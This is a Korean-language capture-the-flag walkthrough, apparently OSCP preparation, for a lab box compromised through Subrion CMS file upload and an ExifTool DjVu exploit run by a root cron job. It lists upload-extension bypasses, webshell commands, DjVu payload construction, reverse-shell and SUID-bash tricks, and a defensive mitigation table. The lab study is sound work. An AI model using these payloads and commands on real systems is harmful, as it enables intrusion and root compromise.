공개 익스플로잇을 받으면 읽는 순서를 정해 두는 게 낫다. 먼저 하드코딩된 값을 뒤진다 — 쿠키·토큰·IP·경로·포트를 `grep -nE "(Cookie|token|192\.168|http://)" exploit.py` 로 훑는다. 다음이 `input()`·`raw_input()`·`getpass` 같은 대화형 입력이고, 그다음이 요청 흐름이다. 로그인 → 토큰 획득 → 페이로드로 이어지는데 **실제로 필요한 요청은 보통 2~3개뿐이다.** 그 2~3개를 curl 이나 20줄 파이썬으로 재구현한다. 남의 코드의 실패 원인을 찾는 시간이 필요한 요청을 다시 쓰는 시간보다 거의 항상 길다.

확장자 블랙리스트 우회 후보는 `.phar` 외에도 Apache 설정에 따라 `.php3` `.php4` `.php5` `.php7` `.pht` `.phtml` `.phps` `.inc` 가 있다. 반대로 화이트리스트라면 이중확장자(`shell.php.jpg`)나 널바이트를 노린다. 던지는 순서는 현행 Debian/Ubuntu 정규식에 포함된 `.phar`·`.phtml` 이 먼저고, 구형 `AddType` 설정을 노린 `.php3`~`.php7`·`.pht`, 대소문자·후행문자(`.PHP`, `.php.`, `.php%20`), 마지막이 `.htaccess` 업로드로 handler 를 직접 추가하는 방법(`AddType application/x-httpd-php .xyz`)이다. 마지막 수는 업로드 디렉터리에 `AllowOverride` 가 켜져 있어야 하지만, 통하면 어떤 확장자든 쓸 수 있게 된다.

### 수동 대안 — curl만으로 같은 결과 얻기

> [!danger] 시험 금지 도구 확인
> Metasploit 에 이 취약점의 모듈이 있다(`exploit/multi/http/subrion_cms_file_upload_rce` 계열). 시험에서 Metasploit 은 전 시험 통틀어 1대에만 쓸 수 있으니 이 정도 난이도에 소진하면 손해다. EDB 49876 같은 단독 익스플로잇 스크립트는 허용되고 수정해서 쓰는 것도 허용된다.

이 박스는 금지 도구를 전혀 쓰지 않았다. curl 과 직접 구현한 업로드 스크립트뿐이다. 수동 절차의 뼈대는 세 요청이다.

```
① POST /panel/                    → 로그인, 세션 쿠키 획득
② GET  /panel/uploads/            → HTML에서 CSRF 토큰(__st)과 target ID 추출
③ POST /panel/uploads/read.json   → cmd=upload, multipart로 .phar 전송
```

토큰 추출은 정규식 한 줄이면 된다(`grep -oP` 또는 파이썬 `re`). UI 를 클릭해서 Burp 로 잡은 뒤 "Copy as curl" 하는 것이 가장 빠른 시작점이고, 거기서 불필요한 헤더를 걷어내면 그대로 재현 스크립트가 된다.

---

## 4. 권한상승

### 4-1. 셸을 잡자마자 치는 것

```bash
id                          # 권한 확인
sudo -l                     # sudo 규칙 (www-data는 보통 비밀번호를 모름)
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null     # capability
cat /etc/crontab; ls -la /etc/cron.*      # 크론  ← 이 박스의 정답
```

이 박스의 답은 **다섯 번째 줄**에 있다. `www-data` 는 sudo 규칙이 없고 특이한 SUID 도 없어서 크론이 유일한 경로였다.

### 4-2. 크론 스크립트를 반드시 `cat` 해야 하는 이유

```bash
www-data@exfiltrated:/$ cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

```bash
www-data@exfiltrated:/$ tail -1 /etc/crontab
* *	* * *	root	bash /opt/image-exif.sh

www-data@exfiltrated:/$ exiftool -ver
11.88
```

이 세 줄에서 제약 조건이 확정된다.

| 확인 항목 | 값 | 의미 |
|---|---|---|
| 감시 경로 | `/var/www/html/subrion/uploads` | 웹루트가 `/subrion/` 하위다. `/var/www/html/uploads` 가 아니다 |
| 파일명 필터 | `ls \| grep "jpg"` | 파일명에 `jpg` 문자열이 반드시 포함돼야 한다 |
| 주기 | `* * * * *` (매분) | 최소 60초 대기 |
| exiftool | 11.88 | CVE-2021-22204 취약(12.24에서 수정) |

흔한 writeup 은 감시 경로를 `/var/www/html/uploads` 라고 적지만 이 박스는 **`/var/www/html/subrion/uploads`** 다. `grep "jpg"` 필터도 스크립트를 읽지 않으면 모른다. `payload.png` 로 올렸다면 크론이 아예 처리하지 않는다.

> [!warning] 조건이 틀리면 에러 없이 조용히 무시된다
> 크론은 정상 종료하고, 로그는 `/opt/metadata/` 에 쌓이고, 공격자는 60초를 기다린 뒤 "왜 안 되지"를 반복한다. 3회면 3분, 가설을 바꿔가며 10회면 10분이 사라진다. 크론 기반 권한상승에서 시간을 태우는 것은 익스플로잇이 아니라 조건 오판이다.

그래서 순서가 뒤집힌다. 던지고 확인하는 게 아니라 조건을 전부 확정한 뒤 한 번에 던진다. 스크립트에서 읽어낼 것은 다른 크론 박스에도 그대로 적용된다.

| 확인 | 왜 |
|---|---|
| 감시 경로의 절대값 | 웹루트와 다를 수 있다 ← 이 박스 |
| 파일명·확장자 필터 | `grep`·`find -name`·`*.jpg` glob ← 이 박스 |
| 쓰기 권한 | 그 디렉터리에 `www-data` 가 쓸 수 있어야 한다 |
| 호출되는 바이너리와 버전 | exiftool·convert·tar·7z 전부 알려진 취약점 보유 |
| 인용 처리 | `"$IMAGES/$filename"` 처럼 따옴표가 있으면 파일명 인젝션은 불가. 없으면 파일명 자체가 페이로드가 된다 |
| 와일드카드 사용 | `tar *`·`rsync *` 는 와일드카드 인젝션(`--checkpoint-action`) 경로 |
| 실행 주체 | `/etc/crontab` 의 5번째 필드. `root` 가 아니면 가치가 떨어진다 |

이 스크립트는 `exiftool "$IMAGES/$filename"` 로 따옴표가 제대로 걸려 있어서 파일명 인젝션(예: `; nc ...`)은 안 된다. 그러면 **파일 내용 쪽 취약점인 CVE-2021-22204 가 유일한 길**이 되고, 이 판단이 페이로드 방향을 결정했다.

### 4-3. DjVu 페이로드 제작

```bash
┌──(kali㉿kali)-[~/PG/Exfiltrated/exif]
└─$ bzz payload payload.bzz
└─$ djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTz=payload.bzz
└─$ convert -size 64x64 xc:red image.jpg
└─$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg
└─$ md5sum image.jpg
5f817e389ada908a21433ad20403a884  image.jpg
```

| 명령 | 하는 일 |
|---|---|
| `bzz payload payload.bzz` | 주석 텍스트를 bzz 압축. DjVu 의 `ANTz` 청크는 압축된 주석만 받는다 |
| `djvumake ... INFO=0,0 BGjp=/dev/null ANTz=payload.bzz` | 최소 DjVu 컨테이너 조립. `INFO=0,0` 은 0×0 이미지, `BGjp=/dev/null` 은 빈 배경이다. 파서에 도달하는 것이 목적이라 실제 이미지 데이터는 필요 없다 |
| `convert -size 64x64 xc:red image.jpg` | 운반체(carrier) JPEG 생성. 내용은 무의미한 빨간 사각형 |
| `exiftool -config configfile '-HasselbladExif<=exploit.djvu' image.jpg` | 2-7 의 사용자 정의 태그에 DjVu 파일 전체를 값으로 삽입. `<=` 는 "파일 내용을 값으로 읽어라" 문법 |
| `md5sum image.jpg` | 전송 무결성의 기준값 확보 ← 다음 단계에서 대조 |

`bzz`·`djvumake` 는 `djvulibre-bin` 패키지에 있다. 칼리에 없으면 `sudo apt install djvulibre-bin`.

### 4-4. 배치 — 파일 매니저 대신 웹셸로 직접 쓴다

파일 매니저가 이미지를 재인코딩하거나 리사이즈하면 EXIF 에 심은 DjVu 청크가 날아간다. 웹셸로 base64 를 흘려넣어 바이트를 그대로 쓰는 쪽이 안전하다.

```bash
┌──(kali㉿kali)-[~/PG/Exfiltrated]
└─$ B64=$(base64 -w0 exif/image.jpg)
└─$ curl -G --data-urlencode "cmd=echo $B64 | base64 -d > /var/www/html/subrion/uploads/evil.jpg; md5sum /var/www/html/subrion/uploads/evil.jpg" \
     http://exfiltrated.offsec/uploads/exfsh01.phar
5f817e389ada908a21433ad20403a884  /var/www/html/subrion/uploads/evil.jpg
```

**MD5 가 일치**하니 전송 중 손상은 없다([[Squid]]·[[Exghost]] 에서 굳힌 습관이다). 파일명이 `evil.jpg` 라 `grep "jpg"` 필터도 통과한다.

`-G` 와 `--data-urlencode` 는 둘 다 빼면 안 되는 플래그다.

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-G` | `--data-*` 로 만든 본문을 POST 대신 URL 쿼리스트링으로 보낸다 | 웹셸이 `$_GET` 을 읽으므로 POST 로 가면 아무 일도 안 일어난다 |
| `--data-urlencode` | 값을 curl 이 직접 인코딩 | base64 에는 `+`·`/`·`=` 가 들어간다. `+` 는 URL 에서 공백으로 해석되어 디코드가 깨진다 |

이미지가 크면 URL 길이 제한(Apache 기본 `LimitRequestLine` 8190바이트)에 걸린다. 그때는 POST 를 받는 웹셸로 교체하거나, `split` 으로 쪼개 `>>` 로 이어붙이거나, 칼리에서 `python3 -m http.server` 를 띄우고 타겟에서 `wget`/`curl` 로 당기는 순으로 시도한다.

해시 대조는 습관으로 굳혀 둘 값이 있다. 이게 없으면 실패했을 때 페이로드가 틀렸는지, 전송이 깨졌는지, 조건이 안 맞는지 세 가설 사이에서 헤맨다. **MD5 한 줄이 그중 하나를 즉시 지운다.** base64 와 인용 중첩, 웹셸 경유가 겹친 전송은 특히 깨질 여지가 많다. 검증 비용은 5초고 미검증의 대가는 크론 60초 × N회다.

### 4-5. 크론 대기 → root

8초 간격으로 폴링했다:

```
[try 6]  -rwxr-xr-x 1 root root 1183448 /bin/bash        ← 약 48초, 아직
[try 7]  -rwsr-sr-x 1 root root 1183448 /bin/bash        ← SUID 반영됨
```

동시에 5555 리스너에 root 셸이 붙었다:

```bash
listening on [any] 5555 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.163] 53782
root@exfiltrated:~# id; hostname
uid=0(root) gid=0(root) groups=0(root)
exfiltrated
root@exfiltrated:~# cat /root/proof.txt; cat /home/coaran/local.txt
36609d5b634dd0b79041f3ad480fbdd2
46fac3d0bd247ed4b44a22187386b65f
```

SUID 경로도 살아 있었다 — `/bin/bash -p` 로 `euid=0` 확인.

> [!warning] `-p` 가 없으면 SUID bash 는 무용지물이다
> bash 는 euid ≠ uid 를 감지하면 특권을 스스로 버린다. `-p`(privileged mode)를 줘야 euid 를 유지한다.
> ```bash
> /bin/bash -p
> id      # uid=33(www-data) euid=0(root)
> ```
> `whoami` 는 여전히 `www-data` 로 보이므로 `id` 로 `euid` 를 확인해야 한다. 여기서 "안 됐네" 하고 포기하는 것이 흔한 실수다.

시험 증빙용으로 완전한 root 가 필요하면 `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'` 로 승격한다.

폴링 간격을 8초로 잡은 건 크론 주기가 60초라 평균 4초 안에 성공을 감지하기 때문이다. 1초 폴링은 로그와 프로세스를 불필요하게 늘리고 30초 폴링은 성공을 늦게 안다. 결과가 언제 나올지 모르는 비동기 익스플로잇은 폴링을 자동화해 두는 편이 낫다. 손으로 `ls -l` 을 반복하면 집중력이 새고 실패 판정 시점도 흐려진다.

---

## 5. 플래그

| | 위치 | 값 |
|---|---|---|
| `local.txt` | `/home/coaran/local.txt` | `46fac3d0bd247ed4b44a22187386b65f` |
| `proof.txt` | `/root/proof.txt` | `36609d5b634dd0b79041f3ad480fbdd2` |

`local.txt` 가 `/home/coaran/` 에 있는데 **`coaran` 사용자 단계를 거치지 않았다.** `www-data` 에서 root 로 직행했고 root 권한으로 읽었을 뿐이다.

> [!tip] 시험 증거 형식 연습
> 실제 시험에서는 플래그를 한 화면에 담아야 인정된다.
> ```bash
> whoami; hostname; ip a; cat /root/proof.txt
> ```
> 이 박스에서 `id; hostname` 을 플래그와 함께 찍은 것이 그 연습이다. `ip a` 를 빼먹으면 어느 호스트인지 증명이 안 돼서 점수가 날아간다. SUID 경로로 승격했다면 `whoami` 가 `www-data` 로 보일 수 있으니 완전한 root 셸에서 다시 찍는다.

---

## 6. 막혔던 지점 / 시행착오

아래 ①~④는 이 박스에서 실제로 관측하고 대응한 것이고, ⑤~⑧은 원문 기록상 예방적으로 회피한 함정이라 "이 유형에서 흔히 막히는 지점"으로 분류한다. 구분을 흐리면 노트가 신뢰를 잃는다.

### ① gobuster가 시작하자마자 멈췄다 — 실제 발생

```
the server returns a status code that matches the provided options for non existing urls => 301
```

워드리스트를 돌리기도 전에 도구가 스스로 멈췄다. Subrion `.htaccess` 가 존재하지 않는 경로도 전부 라우터로 넘겨 301을 주니 gobuster 의 와일드카드 감지기가 발동한 것이다. 원인은 에러 메시지가 그대로 말해주고 있었다. 여기서 **메시지를 읽지 않고 다른 도구로 갈아타는 것이 최악의 대응**이다 — feroxbuster 로 바꿔도 같은 벽에 부딪힌다. 해결은 `-f` 트레일링 슬래시 모드나 파일 모드 + `-b 404,301`.

와일드카드 응답 자체가 앱 구조에 대한 정보다. 장애물이 아니라 front controller 형 CMS 라는 식별 신호로 읽으면 된다.

### ② 확장자 다중 히트를 "백업 파일 유출"로 오독할 뻔했다 — 실제 발생

```
/panel.php   200  6155
/panel.txt   200  6155
/panel.bak   200  6155
/panel.zip   200  6155
```

`.bak`·`.zip` 은 CTF 나 시험에서 진짜 노다지인 경우가 많아서 반사적으로 다운로드하고 싶어진다. 그러나 **바이트 수가 전부 6155 로 동일**했다. 서로 다른 파일이 우연히 같은 크기일 확률은 사실상 0이다.

오독했다면 `.zip` 을 받아 `file` 로 확인하고, HTML 이 나오니 압축이 깨졌나 의심하고, `binwalk`·`foremost` 를 돌리다 30분을 날렸을 것이다. 여러 확장자가 같은 크기로 히트하면 라우터 신호로 보고, 다운로드 전에 `curl -sI` 로 `Content-Type` 을, `curl -s | head` 로 본문 첫 줄을 본다. 5초면 판정된다.

### ③ `200` 응답인데 본문이 404였다 — 실제 발생

```bash
└─$ curl -s http://exfiltrated.offsec/package.json
{"error":true,"message":"Requested URL not found.","code":404,"result":true}
```

스캐너 결과에 200 히트가 대량으로 잡히는데, Subrion API 가 HTTP 200 에 404 JSON 을 실어 보내기 때문이다. **상태 코드는 전송 계층이고 성공·실패는 앱 계층이다** — 이 볼트에서 반복 누적 중인 패턴이다([[Crane]]·[[RubyDome]]·[[Astronaut]]·[[Exghost]]·[[Hawat]]).

실전 대응은 열거 후 응답 크기로 정렬해서 다수를 차지하는 크기, 즉 템플릿 404 를 찾아 필터로 제외하는 것이다. gobuster 는 `--exclude-length`, ffuf 는 `-fs`.

### ④ EDB 49876을 그대로 돌려서는 안 됐다 — 실제 발생

증상은 로그인은 성공했다고 나오는데 업로드만 실패하거나, 스크립트가 마지막에 멈춰 응답이 없는 형태로 나온다. 원인은 둘이다. 하드코딩된 세션 쿠키 `INTELLI_06c8042c3d=15ajqmku31n5e893djc8k8g7a0` 가 `requests` 세션의 실제 쿠키를 덮어쓰고, 끝부분의 `input()` 대화 루프가 비대화식 실행에서 멈춘다.

소스를 읽고 업로드 요청만 떼어내 직접 구현했다(`sub_upload.py`). 전체를 디버깅하는 것보다 필요한 요청 3개만 재구현하는 쪽이 압도적으로 짧다. [[Levram]]·[[Exghost]] 와 같은 결론이다 — **익스플로잇이 안 돌면 즉시 소스를 읽는다.** 옵션을 바꿔가며 재실행하는 것이 함정이다.

하드코딩 쿠키가 특히 나쁜 이유는 실패가 조용해서다. 로그인 요청은 200을 받고 세션도 만들어지는데 다음 요청만 권한이 없다. 네트워크 캡처 없이는 원인이 안 보인다. 공개 익스플로잇을 받으면 실행 전에 `grep -nE "(Cookie|token|sessid|192\.168|127\.0\.0\.1)"` 부터 돌리는 것이 5초로 30분을 아끼는 방법이다.

### ⑤ 크론 감시 경로를 넘겨짚기 — 이 유형에서 흔히 막히는 지점

원문 기록상 이 박스에서는 스크립트를 먼저 `cat` 해서 회피했다. 그러나 이 유형의 대표적 실패 지점이다.

흔한 오답은 웹루트를 문서 루트로 가정한 `/var/www/html/uploads` 이고, 정답은 **`/var/www/html/subrion/uploads`** 다. 틀리면 페이로드를 놓고 60초를 기다려도 아무 일이 없고 **에러도 없다.** 실패 신호가 없으니 페이로드가 잘못됐나를 먼저 의심하게 되고, 페이로드를 다시 만들어 또 60초를 태우는 동안 원인은 그대로 남는다.

회피는 **`cat /opt/image-exif.sh` 한 줄**이다. 크론 스크립트를 읽지 않고 페이로드를 만드는 것은 눈을 감고 던지는 것과 같다.

### ⑥ `grep "jpg"` 파일명 필터 — 이 유형에서 흔히 막히는 지점

```bash
ls $IMAGES | grep "jpg" | while read filename;
```

`payload.png`·`exploit.djvu`·`shell.jpeg` 로 올리면 크론이 아예 처리하지 않는다. 미묘한 점은 `grep "jpg"` 가 확장자가 아니라 **파일명 어디에든 `jpg` 문자열이 있으면** 통과시킨다는 것이다. `jpgpayload.txt` 도 통과하고, 반대로 **`.jpeg` 는 통과하지 못한다.** 여기서는 파일명을 `evil.jpg` 로 지어 필터를 만족시켰다.

필터 조건은 정확한 문자열로 읽어야 한다. "이미지 파일을 처리하는구나"로 요약하면 `.jpeg` 에서 죽는다.

### ⑦ 파일 매니저 업로드로 EXIF가 날아갈 위험 — 이 유형에서 흔히 막히는 지점

원문 판단은 elFinder 가 이미지를 재인코딩하거나 리사이즈하면 EXIF 에 심은 DjVu 청크가 소실된다는 것이었고, 그래서 처음부터 웹셸로 바이트를 그대로 썼다. 파일 매니저로 올렸다면 파일은 정상으로 보이고 크기도 비슷하고 크론도 도는데 페이로드만 사라진다. ⑤와 마찬가지로 **실패 신호가 없다.** MD5 대조로 원본과 타겟의 해시가 같음을 확인하면 전송 가설은 완전히 제거된다.

이미지 메타데이터 페이로드는 이미지를 다루는 경로를 통과시키지 않는 것이 원칙이다. 썸네일 생성, 리사이즈, 포맷 변환, CDN 최적화가 전부 페이로드 파괴자다. 가능하면 파일시스템에 직접 쓴다.

### ⑧ 60초 크론 대기의 심리 — 시간 배분

시도 1회에 최소 60초가 든다. 조건이 셋(경로·파일명·페이로드 무결성)인데 하나씩 바꿔가며 시행착오하면 최악 8회, 8분 넘게 태우고도 실패 원인을 알 수 없다. 이 박스에서는 **던지기 전에 셋을 전부 확정**했다. 스크립트 `cat` 으로 경로와 필터를, MD5 대조로 무결성을, 페이로드 이중화로 성공 판정 채널 두 개를 확보했다.

손절선은 이렇게 잡는다.

| 시점 | 판단 |
|---|---|
| 2회 실패(약 2분) | 페이로드를 더 만들지 말고 조건 재확인으로 돌아간다. `ls -la` 로 파일이 실제로 있는지, 파일명이 필터를 만족하는지 |
| 3회 실패(약 3분) | `/opt/metadata/` 의 최신 로그를 `cat` 한다. 크론이 그 파일을 처리했는지가 로그에 남는다. 처리 자체가 안 됐으면 조건 문제, 처리했는데 실행이 안 됐으면 페이로드 문제 |
| 5분 초과 | exiftool 경로를 접고 다른 권한상승 경로로 전환(커널 5.4.0-74, `/etc/passwd` 쓰기 가능 여부, 다른 크론) |

결과가 즉시 안 나오는 익스플로잇은 **관측 채널을 먼저 확보**해 두는 것이 일반 규칙이다. 여기서는 `ls -l /bin/bash` 로 SUID 반영 여부를, 리스너로 리버스셸을, `/opt/metadata/` 로그로 크론이 파일을 봤는지를 볼 수 있었다. 채널이 하나뿐이면 실패 원인을 좁힐 수 없다.

### ⑨ 리버스셸이 안 붙었다면 — 이 유형에서 흔히 막히는 지점

이 박스에서는 5555 리버스셸이 정상적으로 붙었다(`connect to [192.168.45.207] from ... 53782`). 하지만 안 붙었을 때 무엇을 의심할지는 미리 정해 두어야 한다. 크론 경유라 한 번 시도에 60초가 들기 때문이다.

| 의심 순서 | 확인 방법 | 대응 |
|---|---|---|
| ① 페이로드가 아예 실행 안 됨 | `ls -l /bin/bash` — SUID 가 걸렸으면 코드는 실행됐고 네트워크만 실패 | 이중화의 값이 여기서 나온다 |
| ② 리스너가 안 떠 있음 / 포트 점유 | 칼리에서 `ss -tlnp \| grep 5555` | `nc -lvnp` 재기동 |
| ③ 아웃바운드 포트 차단 | 443 · 80 · 53 으로 바꿔 재시도 | 1024 미만은 `sudo nc -lvnp 443` |
| ④ VPN 인터페이스 IP 오기 | `ip a show tun0` 로 실제 IP 재확인 | 페이로드 재생성 |
| ⑤ `/dev/tcp` 미지원 셸 | 타겟이 dash/busybox 면 bash 전용 문법이 안 먹는다 | `nc -e`, `mkfifo` 방식, `python3 -c` 로 교체 |

이 박스가 준 안전장치는 `chmod +s /bin/bash` 였다. **네트워크와 무관한 성공 판정 채널**이라, 리버스셸만 걸었다면 ①과 ③을 구분할 방법이 없어 60초짜리 추측을 반복했을 것이다. [[Hawat]] 에서는 실제로 아웃바운드가 443만 열려 4444 리스너가 영영 안 붙었다.

### ⑩ 이 단계에서 실패했다면 다음 후보 경로는 — 분기 계획

시험에서는 막혔을 때 다음 수를 즉석에서 고민하면 늦다. 각 단계의 대안을 미리 세워 둔다.

| 막힌 지점 | 다음 후보 |
|---|---|
| `/panel` 기본 자격증명 실패 | `/members/` 로 사용자명 열거 → `/login/` 에 소수 후보로 패스워드 스프레이(계정 잠금 주의). `/forgot/` 로직 결함. `/install/`·`/updates/` 재실행 가능 여부 |
| 업로드 확장자 전부 차단 | `.htaccess` 업로드로 handler 추가 → 경로 트래버설(`../../`)로 저장 위치 변경 → Subrion 4.2.1 의 다른 알려진 결함(XSS·LFI) 조사 → `/cron/`(비인증 크론 트리거)의 파라미터 조작 |
| 웹셸은 됐는데 크론이 없었다면 | `find / -perm -4000` SUID · `getcap -r /` capability · `/etc/passwd`·`/etc/shadow` 쓰기 권한 · `ss -tlnp` 로 내부 전용 서비스(MySQL·Redis) · 커널 5.4.0-74 대상 익스플로잇 |
| exiftool 이 패치본(12.24+)이었다면 | 크론 스크립트 자체의 쓰기 권한 확인(`/opt/image-exif.sh` 가 `www-data` 쓰기 가능이면 스크립트를 직접 수정하는 것이 훨씬 빠르다) · `/opt/metadata/` 권한 · `openssl`·`ls` PATH 하이재킹 여부 |

**크론 스크립트 자체의 권한을 먼저 확인하는 것이 정석이다.** 저권한 사용자에게 쓰기 가능하면 CVE 가 필요 없고 `echo 'chmod +s /bin/bash' >> /opt/image-exif.sh` 한 줄로 끝난다. 크론을 발견하면 스크립트 쓰기 권한, 스크립트가 참조하는 파일·디렉터리 권한, 호출 바이너리의 취약점 순으로 본다. 이 박스는 앞의 둘이 막혀 세 번째로 갔다.

---

## 7. OSCP 시험 관점

1. **리다이렉트 대상 호스트명은 `/etc/hosts` 에 등록한다.** IP 로 접근하면 `exfiltrated.offsec` 으로 302되어 이후 요청이 전부 엉킨다. 302 응답의 `Location` 을 항상 확인할 것.
2. **`robots.txt` 는 관리 경로 목록이다.** 브루트포싱보다 먼저 본다. 여기서 `/panel` 이 공짜로 나왔고, 그 경로 이름이 제품 식별 단서이기도 했다.
3. **확장자 블랙리스트는 `.phar` 로 뚫린다.** Apache 가 PHP 로 처리하는 확장자는 `.php` 말고도 `.phar` `.php3~7` `.pht` `.phtml` 등이 있다. 응답의 `mime: text/x-php` 가 확장자만 검사한다는 증거였다.
   - 근거는 Ubuntu/Debian 의 PHP 모듈 설정 `<FilesMatch ".+\.ph(ar|p|tml)$">` 다. `.phar`·`.phtml` 이 1순위고, `.php3`~`.php7`·`.pht` 는 구형 `AddType` 설정이 남은 서버에서만 통한다.
   - 실행 프로브는 `<?php echo 7*6; ?>` 를 각 확장자로 올려 `42` 가 나오는지 보는 것.
4. **공개 익스플로잇의 하드코딩된 쿠키를 조심한다.** EDB 49876 은 세션 쿠키가 박혀 있어 `requests` 에서 실제 세션을 덮어쓴다. 게다가 `input()` 루프라 비대화식에서 멈춘다. 소스를 읽고 필요한 요청만 떼어내 직접 구현하는 편이 빠르다.
   - 실행 전 루틴: `grep -nE "(Cookie|token|sessid|192\.168|input\()" exploit.py`
5. **크론 스크립트는 반드시 `cat` 해서 제약을 확인한다.** 이 박스는 경로가 `/var/www/html/subrion/uploads` 하위 디렉터리였고 `grep "jpg"` 파일명 필터가 있었다. 둘 중 하나만 틀려도 페이로드가 조용히 무시된다.
6. **재시도 비용이 큰 상황에서는 페이로드를 이중화한다.** `chmod +s /bin/bash` 와 리버스셸을 동시에 걸어 한쪽 실패에 대비했다. 리버스셸은 `( ... &)` 로 백그라운드에 던져 크론이 멈추지 않게 한다.
7. **이미지 페이로드는 파일 매니저 대신 웹셸로 바이트 그대로 쓴다.** 재인코딩과 리사이즈가 EXIF 청크를 날린다. 쓰고 나서 MD5 로 대조한다.
8. **같은 CVE 라도 트리거가 다르면 접근이 달라진다.** [[Exghost]] 의 CVE-2021-22204 는 웹 업로드가 즉시 실행했지만 여기는 root 크론이 훑는다. 셸을 먼저 잡고 감시 디렉터리에 놓는 순서가 된다.
9. **시험 금지 도구 경계를 정확히 알아 둔다.**

| 도구 | 시험 | 이 박스에서의 대안 |
|---|---|---|
| Metasploit / Meterpreter | 전 시험 통틀어 1대만 | 이 정도 난이도에 소진하지 마라. `curl` 3요청으로 충분하다 |
| sqlmap · 자동 익스플로잇 도구 | 금지 | 이 박스는 애초에 SQLi 가 없다 |
| AutoRecon | 허용 — 열거 전용이라 제한 대상이 아니다 | 쓰지 않았지만 썼어도 규정 문제는 없다 |
| EDB 단독 익스플로잇 스크립트 | 허용 (수정도 허용) | 단, 그대로 돌리면 실패한다 — 읽고 고쳐 쓴다 |
| gobuster·ffuf·nmap·nikto·curl·msfvenom·nc | 허용 | 전 과정을 이것들로 수행 |

10. **셸을 잡자마자 칠 명령 5개** — `id` · `sudo -l` · `find / -perm -4000 -type f 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.*`.
    이 박스의 답은 다섯 번째에 있었다. 추가로 이미지·미디어 처리 도구의 버전(`exiftool -ver`, `convert -version`)을 확인하면 CVE-2021-22204 나 ImageTragick 경로가 즉시 보인다.
11. **SUID bash 는 `-p` 없이는 무용지물이다.** `/bin/bash -p` 후 `id` 로 euid=0 을 확인한다. `whoami` 는 원래 사용자로 보이니 여기서 포기하지 않는다.
12. **시간 배분** — 이 박스의 이상적 배분은 다음과 같다.

| 단계 | 목표 시간 | 손절 기준 |
|---|---|---|
| nmap + robots.txt + 버전 판정 | 10분 | 포트 2개뿐이라 길어질 이유가 없다 |
| `/panel` 기본 자격증명 | 5분 | `admin:admin`·`admin:password`·제품 기본값. 안 되면 즉시 열거로 복귀 |
| 업로드 우회 → 웹셸 | 20분 | 확장자 후보를 전부 던져도 10분. 30분 넘으면 다른 표면으로 |
| 크론 발견 + 조건 확정 | 10분 | `cat` 한 번이면 끝난다 |
| 페이로드 제작 + 배치 + 대기 | 15분 | 5분(약 5사이클) 넘으면 조건 재검토, 그래도 안 되면 경로 전환 |

---

## 8. 방어 관점

| 결함 | 왜 위험한가 | 조치 |
|---|---|---|
| 관리자 기본 자격증명 `admin:admin` | 인증 후 RCE(CVE-2018-19422)를 비인증 RCE 와 동등하게 만든다 | 설치 시 강제 비밀번호 변경, 관리 패널에 IP 제한·MFA |
| 확장자 블랙리스트 업로드 검증 | 위험 집합이 웹서버 설정에 좌우되어 앱이 알 수 없는 것을 막으려 한다 | 화이트리스트로 전환. 나아가 업로드 파일은 원래 확장자를 버리고 무작위 이름 + 안전한 확장자로 저장 |
| MIME 을 판정하고도 차단에 쓰지 않음 | 검사 결과가 로깅용으로만 존재. 방어 착시 | 콘텐츠 기반 판정을 차단 경로에 연결. `text/x-php` 판정 시 즉시 거부 |
| 업로드 디렉터리가 웹루트 아래, 실행 가능 | 파일 쓰기가 곧 RCE | `/var/www/html` 밖에 저장하고 스크립트로 서빙. 불가하면 `.htaccess` 에 `php_flag engine off` 또는 `<FilesMatch> SetHandler None`, 또는 `Options -ExecCGI` |
| Subrion 4.2.1 — EOL, 영구 미패치 | 패치가 나오지 않으므로 시간이 지나도 안전해지지 않는다 | 제품 교체 또는 WAF 로 `/panel/uploads/` 차단. EOL 제품은 운영 중단이 유일한 근본 대책 |
| ExifTool 11.88 (CVE-2021-22204) | 파일을 읽기만 해도 코드 실행 | 12.24 이상으로 업그레이드. 불가하면 DjVu 처리 비활성화 |
| root 크론이 웹 업로드 디렉터리를 처리 | 공격자가 쓸 수 있는 데이터를 최고 권한이 파싱한다 | 전용 저권한 계정으로 실행. 신뢰 경계를 넘는 데이터는 낮은 권한에서 처리 |
| 크론이 처리 전 파일을 검증하지 않음 | 무엇이든 들어오는 대로 exiftool 에 넘긴다 | 매직바이트·크기 검증, 컨테이너/샌드박스(`bubblewrap`·`firejail`)에서 파싱 |
| `/bin/bash` 에 SUID 를 걸 수 있음 | 권한상승이 영구화된다 | 파일 무결성 모니터링(AIDE·auditd)으로 SUID 비트 변경 감지 |
| `robots.txt` 가 관리 경로를 열거 | 정찰 비용을 0으로 만든다 | 민감 경로는 `robots.txt` 에 적지 않는다. 숨김이 방어는 아니지만 불필요한 정보 제공은 피한다 |

한 줄로 줄이면 **신뢰할 수 없는 데이터를 최고 권한 프로세스가 파싱하게 두지 마라**가 된다. 업로드 필터도 exiftool 버전도 결국 이 원칙의 파생이다. root 크론이 `www-data` 가 쓴 파일을 읽는 순간 나머지 방어는 전부 부수적이 된다.

---

## 9. 참고 자료

- CVE-2018-19422 — Subrion CMS ≤ 4.2.1, 인증 후 임의 파일 업로드 → RCE
  - https://nvd.nist.gov/vuln/detail/CVE-2018-19422
  - Exploit-DB 49876 (Python) — 하드코딩 쿠키와 `input()` 루프 주의, 읽고 필요한 요청만 떼어내 쓸 것
- CVE-2021-22204 — ExifTool 7.44~12.23, DjVu 주석 파싱 시 Perl `eval` 코드 실행 (12.24에서 수정)
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22204
  - 필요 도구: `djvulibre-bin` (`bzz`, `djvumake`)
